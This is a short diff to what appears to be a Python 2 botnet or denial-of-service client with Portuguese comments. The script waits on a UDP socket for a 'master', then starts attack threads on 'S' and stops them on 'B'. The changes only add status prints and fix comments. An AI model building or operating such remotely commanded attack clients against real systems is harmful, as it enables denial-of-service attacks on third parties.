@@ -27,11 +27,13 @@ def Is_attack(msg):
 
     #Se receber a mensagem S de start 
     if (msg == 'S'):
-        #Nao mata as threas e continua o attack
+        print 'Starting attack'
+        #Nao mata as threads e continua o ataque
         Kill = False
     #Se receber a mensagem B de BREAK    
     elif (msg == 'B'):
-        #Mata
+        #Mata as threads e para o ataque
+        print 'Attack over'
         Kill = True
 
 #Funcao que ira criar as Threas 
@@ -75,6 +77,8 @@ def listening():
 
     #Junta porta com o nome do host
     serverSocket.bind((hostName, serverPort))
+
+    print 'Waiting for my master...'
 
     while not sentence:
         sentence, addr = serverSocket.recvfrom(1024)
